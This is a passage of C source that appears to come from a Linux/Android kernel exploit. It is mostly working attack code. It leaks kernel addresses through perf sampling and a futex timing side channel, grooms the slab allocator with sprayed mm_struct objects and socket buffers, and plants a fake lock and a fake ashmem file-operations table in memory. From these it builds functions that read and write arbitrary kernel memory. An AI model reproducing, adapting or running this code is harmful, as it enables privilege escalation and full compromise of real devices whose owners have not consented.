      uint64_t ip = *(uint64_t *)p; p += 8;
      uint64_t abi = *(uint64_t *)p; p += 8;
      if (abi < 4) wl_abi_hist[abi]++;
      if (abi == 2) {                       /* PERF_SAMPLE_REGS_ABI_64 */
        uint64_t sp = ((uint64_t *)p)[31];
        uint64_t lo = sp & 0x3fffULL;
        wl_lo_hist[lo & 0xff]++;               /* residue histogram (calibration) */
        uint64_t w = (sp & ~0x3fffULL) | (wl_lo_mask & 0x3fffULL);
        (void)ip;
        if ((w >> 32) == 0xffffff80ULL) {
          wl_insock++;                          /* accepted */
          int k = -1;
          for (int t = 0; t < wl_nc; t++) if (wl_cand[t] == w) { k = t; break; }
          if (k >= 0) wl_cnt[k]++;
          else if (wl_nc < 16) { wl_cand[wl_nc] = w; wl_cnt[wl_nc] = 1; wl_nc++; }
        }
      }
    } else if (ev->type == PERF_RECORD_LOST) {
      wl_ring_lost++;
    }
    pos += ev->size;
  }
  hdr->data_tail = pos;
}

uint64_t ssopt_perf_result(void) {
  uint64_t best = 0; int bestn = 0;
  for (int t = 0; t < wl_nc; t++)
    if (wl_cnt[t] > bestn) { bestn = wl_cnt[t]; best = wl_cand[t]; }
  pr_info("waiter leak: samples=%d accepted=%d cands=%d best=%016zx x%d "
          "lost=%d lo=0x%zx\n",
          wl_samples, wl_insock, wl_nc, (uintptr_t)best, bestn, wl_ring_lost,
          (size_t)wl_lo_mask);
  pr_info("  abi hist: none=%d a32=%d a64=%d x=%d\n",
          (int)wl_abi_hist[0], (int)wl_abi_hist[1], (int)wl_abi_hist[2],
          (int)wl_abi_hist[3]);
  {   /* top-3 SP residues: lets us calibrate WAITER_LO14 from the log */
    for (int r = 0; r < 3; r++) {
      uint64_t bv = 0; int bi = -1;
      for (int t = 0; t < 256; t++) if (wl_lo_hist[t] > bv) { bv = wl_lo_hist[t]; bi = t; }
      if (bi < 0 || bv == 0) break;
      pr_info("  sp&0x3fff hist[%d] = %d\n", bi, (int)bv);
      wl_lo_hist[bi] = 0;
    }
  }
  return best;
}

void ssopt_perf_close(void) {
  if (ssopt_perf_fd >= 0) {
    ioctl(ssopt_perf_fd, PERF_EVENT_IOC_DISABLE, 0);
    if (ssopt_perf_buf) munmap(ssopt_perf_buf, ssopt_perf_msz);
    close(ssopt_perf_fd);
  }
  ssopt_perf_buf = NULL;
  ssopt_perf_fd = -1;
}


static long mm_slab_num_slabs(void) {
  FILE *f = fopen("/proc/slabinfo", "r");
  if (!f) return -1;
  char line[512];
  long total = -1;
  while (fgets(line, sizeof(line), f)) {
    if (strncmp(line, "mm_struct ", 10) != 0) continue;
    char *p = strstr(line, "slabdata");
    if (p) { long active = -1; sscanf(p + 8, "%ld %ld", &active, &total); }
    break;
  }
  fclose(f);
  return total;
}


/* ============================================================================
 * Direction 2: leak the direct-map address of a writable memfd (tmpfs) page
 * with perf REGS_INTR sampling, then load the fake rt_mutex image into that
 * same page.  No mm slab / SLUB release involved.
 * ========================================================================== */
static int perf_page_fd = -1;
static unsigned char *perf_page_map;

/* Rewrite the fake fops table inside our page (MAP_SHARED) after the walk.
 * The rb-tree PI write clobbers slots of the table (llseek at least, observed
 * owner too), and misc_open() reads c->fops->owner right away -> rewrite the
 * whole table with the correct (slid) pointers before opening /dev/ashmem. */
void ssopt_repair_fake_fops_page(void) {
  if (!perf_page_map || !fake_fops) return;
  size_t poff = (size_t)((W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 1) - LOCK_OFF); /* fake_fops page off */
  unsigned char *p = perf_page_map + poff;
  uint64_t owner_before = *(volatile uint64_t *)(p + FOPS_OWNER_OFF);
  pr_info("ssopt fops page dump pg[0x100..0x13f] / pg[0x300..0x33f]:");
  for (int q = 0; q < 0x40; q += 8) {
    pr_info("  pg[%03x]=%016llx  pg[%03x]=%016llx",
            0x100+q, (unsigned long long)*(volatile uint64_t *)(perf_page_map+0x100+q),
            0x300+q, (unsigned long long)*(volatile uint64_t *)(perf_page_map+0x300+q));
  }
  pr_info("DIAG writeval pg3c0=%016llx pg318=%016llx pg320=%016llx pg328=%016llx",
          (unsigned long long)*(volatile uint64_t *)(perf_page_map+0x3c0),
          (unsigned long long)*(volatile uint64_t *)(perf_page_map+0x318),
          (unsigned long long)*(volatile uint64_t *)(perf_page_map+0x320),
          (unsigned long long)*(volatile uint64_t *)(perf_page_map+0x328));
  pr_info("  fops slots: owner=%016llx llseek=%016llx read_iter=%016llx "
          "write_iter=%016llx ioctl=%016llx open=%016llx release=%016llx\n",
          (unsigned long long)*(volatile uint64_t *)(p+FOPS_OWNER_OFF),
          (unsigned long long)*(volatile uint64_t *)(p+FOPS_LLSEEK_OFF),
          (unsigned long long)*(volatile uint64_t *)(p+FOPS_READ_ITER_OFF),
          (unsigned long long)*(volatile uint64_t *)(p+FOPS_WRITE_ITER_OFF),
          (unsigned long long)*(volatile uint64_t *)(p+FOPS_IOCTL_OFF),
          (unsigned long long)*(volatile uint64_t *)(p+FOPS_OPEN_OFF),
          (unsigned long long)*(volatile uint64_t *)(p+FOPS_RELEASE_OFF));
  pr_info("  wp=%016llx wr=%016llx wl=%016llx fake_fops=%016llx fake_w0=%016llx base?=%016llx",
          (unsigned long long)ssopt_write_pc, (unsigned long long)ssopt_write_right,
          (unsigned long long)ssopt_write_left, (unsigned long long)fake_fops,
          (unsigned long long)fake_w0, (unsigned long long)(fake_fops - (FOPS_TABLE_OFF-LOCK_OFF)));
  fsync(1);
  put64(p, FOPS_OWNER_OFF, 0);
  put64(p, FOPS_LLSEEK_OFF, text_addr(NOOP_LLSEEK));
  put64(p, FOPS_READ_OFF, text_addr(CONFIGFS_READ_FILE));
  put64(p, FOPS_WRITE_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER));
  put64(p, FOPS_READ_ITER_OFF, 0);
  put64(p, FOPS_WRITE_ITER_OFF, 0);
  put64(p, FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL));
  put64(p, FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL));
  put64(p, FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP));
  put64(p, FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN));
  put64(p, FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE));
  put64(p, FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ));
  put64(p, FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO));
  pr_info("ssopt fops page repair: poff=%#zx owner_before=%016llx "
          "llseek=%016llx open=%016llx\n",
          poff, (unsigned long long)owner_before,
          (unsigned long long)text_addr(NOOP_LLSEEK),
          (unsigned long long)text_addr(ASHMEM_OPEN));
  fsync(1);
}


static uintptr_t leak_page_via_perf(void)
{
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.size = sizeof(pe);
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.sample_period = 200;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << 32) - 1;
  pe.disabled = 1;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  pe.exclude_idle = 1;
  int pfd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (pfd < 0) { pr_warning("perf_event_open errno=%d\n", errno); return 0; }
  size_t msz = PAGE_SIZE * 33;
  unsigned char *buf = mmap(0, msz, PROT_READ | PROT_WRITE, MAP_SHARED, pfd, 0);
  if (buf == MAP_FAILED) { pr_warning("perf mmap errno=%d\n", errno); close(pfd); return 0; }

  ioctl(pfd, PERF_EVENT_IOC_ENABLE, 0);
  for (long i = 0; i < 500000; i++)
    pread(perf_page_fd, perf_page_map, PAGE_SIZE, 0);
  ioctl(pfd, PERF_EVENT_IOC_DISABLE, 0);

  struct perf_event_mmap_page *hdr = (void *)buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  unsigned char *base = buf + PAGE_SIZE;
  size_t dsz = PAGE_SIZE * 32;
  uint64_t pos = hdr->data_tail;
  static uint64_t cand[8192];
  static int cnt[8192];
  int nc = 0;
  while (pos < head) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      unsigned char *p = (unsigned char *)ev + sizeof(*ev);
      p += 8; /* ip */
      uint64_t abi = *(uint64_t *)p; p += 8;
      if (abi == 1 || abi == 2) {
        uint64_t *regs = (uint64_t *)p;
        for (int i = 0; i < 32; i++) {
          uint64_t v = regs[i];
          if (v >= 0xffffffc000000000ULL && v < 0xffffffff00000000ULL &&
              (v & (PAGE_SIZE - 1)) == 0) {
            int f = -1;
            for (int k = 0; k < nc; k++) if (cand[k] == v) { f = k; break; }
            if (f < 0 && nc < 8192) { cand[nc] = v; cnt[nc] = 1; nc++; }
            else if (f >= 0) cnt[f]++;
          }
        }
      }
    }
    pos += ev->size;
  }
  munmap(buf, msz);
  close(pfd);
  int bi = -1;
  for (int k = 0; k < nc; k++) if (bi < 0 || cnt[k] > cnt[bi]) bi = k;
  if (bi < 0) { pr_warning("perf page leak: no candidate\n"); return 0; }
  pr_info("perf page leak: top=%016llx count=%d cands=%d\n",
          (unsigned long long)cand[bi], cnt[bi], nc);
  return (uintptr_t)cand[bi];
}

/* Read back a qword of the leaked fake page through the userspace MAP_SHARED
 * mapping (same page-cache page the kernel writes to via its direct-map alias).
 * Used by the mode-4 setsockopt route to VERIFY the PI write without touching
 * ashmem: with WRITE4_SCRATCH=1 write_right is inside our page, so after a
 * successful walk page[SCRATCH_OFF+0x40] must equal the value we painted as
 * tree.parent_color (== fake_fops). */
uint64_t ssopt_page_readback(size_t off) {
  if (!perf_page_map || off + sizeof(uint64_t) > PAGE_SIZE) return 0;
  return *(volatile uint64_t *)(perf_page_map + off);
}

uintptr_t prepare_perf_fake_page(int payload_mode)
{
  if (perf_page_fd < 0) {
    perf_page_fd = (int)syscall(__NR_memfd_create, "ghostlock", 0);
    if (perf_page_fd < 0) { pr_warning("memfd_create errno=%d\n", errno); return 0; }
    if (ftruncate(perf_page_fd, PAGE_SIZE) != 0) {
      pr_warning("ftruncate errno=%d\n", errno); return 0;
    }
  }
  if (!perf_page_map) {
    perf_page_map = mmap(0, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, perf_page_fd, 0);
    if (perf_page_map == MAP_FAILED) {
      perf_page_map = 0; pr_warning("page mmap errno=%d\n", errno); return 0;
    }
  }
  if (!skb_buf) skb_buf = malloc(SKB_SEND_SIZE);
  if (!skb_buf) return 0;

  memset(perf_page_map, 0x41, PAGE_SIZE);      /* fault the page-cache page in */
  uintptr_t base = leak_page_via_perf();
  if (!base) { pr_warning("perf page leak failed\n"); return 0; }

  prepare_skb_payload(base, payload_mode);     /* fills skb_buf; fake_lock==base */
  memcpy(perf_page_map, skb_buf + LOCK_OFF, PAGE_SIZE);  /* image at page offset 0 */
  pr_info("build pg100=%016llx pg108=%016llx pg318=%016llx pg320=%016llx pg328=%016llx "
          "(wr=%016llx wp=%016llx)\n",
          (unsigned long long)*(volatile uint64_t *)(perf_page_map+0x100),
          (unsigned long long)*(volatile uint64_t *)(perf_page_map+0x108),
          (unsigned long long)*(volatile uint64_t *)(perf_page_map+0x318),
          (unsigned long long)*(volatile uint64_t *)(perf_page_map+0x320),
          (unsigned long long)*(volatile uint64_t *)(perf_page_map+0x328),
          (unsigned long long)ssopt_write_right, (unsigned long long)ssopt_write_pc);
  fsync(1);

  pr_info("prepare_perf_fake_page ok base=%016zx lock=%016zx task=%016zx fops=%016zx\n",
          base, fake_lock, fake_task, fake_fops);
  log_sync();
  return base;
}

uintptr_t prepare_kernel_page(int payload_mode) {
  close_reclaim_sockets();
  mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
  prepare_ctxs();

  pr_info("SLUB drain: mm_slabs entry=%ld\n", mm_slab_num_slabs());
  skb_buf = malloc(SKB_SEND_SIZE);
  memset(skb_buf, 0x41, SKB_SEND_SIZE);

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.childs[i] = clone_child();
    prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
  }

  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    spray_ctx.childs[i] = clone_child();
    spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
  }

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  pr_info("KernelSnitch setup: cpus=%d mm_per_slab=%zu prep=%zu spray=%zu "
          "pre=%zu post=%zu\n",
          cpu_count, mm_objs_per_slab, prepare_ctx.mm_cnt, spray_ctx.mm_cnt,
          pre_ctx.mm_cnt, post_ctx.mm_cnt);
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 1, 0);
  pr_info("KernelSnitch parameters: threads=%zu collisions=%zu futexes=%zu "
          "identity_step=0x%zx\n",
          ks->thread_cnt, ks->collisions, ks->total_futexes,
          ks->identity_diff);

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.childs[i] = clone_child();
  }
  child_leak = clone_leak_child();
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.childs[i] = clone_child();
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
  }
  memfd_leak = open_memfd(child_leak);
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    kill_child(pre_ctx.childs[i]);
  }
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    kill_child(post_ctx.childs[i]);
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    kill_child(spray_ctx.childs[i]);
  }
  SYSCHK(waitpid(child_leak, NULL, 0));

  int collisions_found = (int)kernelsnitch_found_collisions(ks);
  pr_info("KernelSnitch collisions: %s\n",
          collisions_found ? "found" : "not found");
  if (!collisions_found) {
    pr_warning("KernelSnitch collision finding failed\n");
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  kernelsnitch_bruteforce(ks);
  uintptr_t leaked = ks->mm_struct;
  pr_info("KernelSnitch bruteforce: state=%d found=%zu mm_struct=0x%zx "
          "off_in_slab=0x%zx\n",
          ks->state, ks->found, leaked, leaked & (ORDER3_SIZE - 1));
  last_mm_struct = leaked;
  if (leaked == (uintptr_t)-1) {
    pr_warning("KernelSnitch mm_struct leak failed\n");
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
  if (!prepare_skb_payload(base, payload_mode)) {
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
  int sndbuf = 1 << 20;
  setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
  int reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
  if (reclaim_flags >= 0) {
    fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
  }
  int pcp_shaping_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv));

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = skb_buf;
  iov.iov_len = SKB_SEND_SIZE;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));

  pin_to_core(CORE);
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    SYSCHK(close(pre_ctx.memfds[i]));
    pre_ctx.memfds[i] = -1;
  }
  for (size_t i = 0; i < post_ctx.mm_cnt - 1; i++) {
    SYSCHK(close(post_ctx.memfds[i]));
    post_ctx.memfds[i] = -1;
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
    SYSCHK(close(spray_ctx.memfds[i]));
    spray_ctx.memfds[i] = -1;
  }

  SYSCHK(close(pcp_shaping_sv[0]));
  SYSCHK(close(pcp_shaping_sv[1]));
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  /* --- 4.14 SLUB per-CPU partial drain (option C) -----------------------
   * __slab_free() freezes a full slab on its first free and leaves it on
   * the per-CPU partial list; freeing its last object while frozen does
   * NOT discard it, so the skb frag's alloc_pages(order 3) never reuses
   * `base`.  put_cpu_partial() runs unfreeze_partials() only when
   * pobjects>cpu_partial.  mm_cache has s->size=896 => cpu_partial=13,
   * but pre+spray freeze only ~7 slabs.  Free the first object of
   * MM_SLUB_DRAIN_SLABS more full prepare_ctx slabs first: this crosses
   * the threshold BEFORE child_leak's mm is freed, so the leak slab is
   * moved off the per-CPU list (unfrozen) and its last free then reaches
   * discard_slab() -> buddy. */
  pr_info("SLUB drain: mm_slabs before=%ld\n", mm_slab_num_slabs());
  for (size_t i = 0; i < MM_SLUB_DRAIN_SLABS; i++) {
    size_t idx = i * mm_objs_per_slab;   /* first object of slab i */
    if (idx >= prepare_ctx.mm_cnt) break;
    if (prepare_ctx.memfds[idx] > 0) {
      SYSCHK(close(prepare_ctx.memfds[idx]));
      prepare_ctx.memfds[idx] = -1;
    }
    kill_child(prepare_ctx.childs[idx]);
    prepare_ctx.childs[idx] = 0;
  }
  pr_info("SLUB drain: mm_slabs after churn=%ld\n", mm_slab_num_slabs());
  SYSCHK(close(memfd_leak));
  memfd_leak = -1;
  pr_info("SLUB drain: mm_slabs after leak free=%ld\n", mm_slab_num_slabs());
  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
    errno = 0;
    ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
    pr_info("reclaim send[%d]=%zd errno=%d\n", i, sent, errno);
    if (sent <= 0) {
      break;
    }
  }
  kernelsnitch_cleanup(ks);
  ks = NULL;

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    if (prepare_ctx.memfds[i] > 0) {
      SYSCHK(close(prepare_ctx.memfds[i]));
      prepare_ctx.memfds[i] = -1;
    }
    kill_child(prepare_ctx.childs[i]);
  }

  log_sync();
  return base;
}

uintptr_t prepare_good_kernel_page(int payload_mode) {
  int max_attempts = KERNEL_PAGE_SETUP_ATTEMPTS;
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    max_attempts = SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS;
  } else if (payload_mode == PAGE_PAYLOAD_FOPS) {
    max_attempts = env_int_range("FOPS_MAX_ATTEMPTS", 24, 4, 72);
  }
  struct timespec deadline;
  clock_gettime(CLOCK_MONOTONIC, &deadline);
  deadline.tv_sec += 180;
  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    uintptr_t base = prepare_kernel_page(payload_mode);
    if (base) {
      pr_info("prepare_kernel_page ok attempt=%d\n", attempt);
      return base;
    }
    struct timespec now;
    clock_gettime(CLOCK_MONOTONIC, &now);
    if (now.tv_sec >= deadline.tv_sec) {
      pr_warning("prepare_kernel_page timeout after %d attempts\n", attempt);
      break;
    }
    pr_warning("prepare_kernel_page retry %d/%d\n", attempt, max_attempts);
  }
  return 0;
}

ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t len) {
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
  put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN, target);
  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, len);
  put32(blob, CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    errno = set_errno;
    return -1;
  }

  errno = 0;
  ssize_t wr = pwrite(fd, data, len, 0);
  return wr;
}

ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
  off_t pos = (off_t)(ASHMEM_PREFIX_COUNT - len);
  uintptr_t page = target - (uintptr_t)pos;
  put64(blob, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN, page);
  put32(blob, CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    errno = set_errno;
    return -1;
  }

  errno = 0;
  ssize_t rd = pread(fd, data, len, pos);
  return rd;
}

int is_kernel_ptr(uintptr_t value) {
  return value >= 0xffff800000000000ULL;
}

int is_direct_ptr(uintptr_t value) {
  return value >= DIRECT_MAP_BASE && value < DIRECT_MAP_END;
}

uint64_t kernel_read64(int fd, uintptr_t target) {
  uint64_t value = 0;
  ssize_t n = kernel_read_data(fd, target, &value, sizeof(value));
  if (n != (ssize_t)sizeof(value)) {
    return 0;
  }
  return value;
}

ssize_t kernel_write_data(int fd, uintptr_t target, const void *data, size_t len) {
  return configfs_write_once(fd, target, data, len);
}

ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len) {
  return configfs_read_once(fd, target, data, len);
}

/* Accessor functions used by fops.c */
uintptr_t pselect_write_value(void) {
  return pselect_custom_value;
}
uintptr_t pselect_write_target(void) {
  return pselect_custom_target;
}
int pselect_custom_write_enabled(void) {
  return pselect_custom_write;
}
int pselect_write_shape(void) {
  return 1;
}
void set_pselect_write(uintptr_t target, uintptr_t value) {
  pselect_custom_target = target;
  pselect_custom_value = value;
  pselect_custom_write = 1;
}

/* Environment variable helpers used by fops.c */
int env_flag(const char *name, int def) {
  char *v = getenv(name);
  if (!v) return def;
  return atoi(v);
}

int env_int_range(const char *name, int def, int min, int max) {
  char *v = getenv(name);
  if (!v) return def;
  int val = (int)strtol(v, NULL, 0);
  if (val < min) return min;
  if (val > max) return max;
  return val;
}

unsigned long env_ulong(const char *name, unsigned long def) {
  char *v = getenv(name);
  if (!v) return def;
  return strtoul(v, NULL, 0);
}
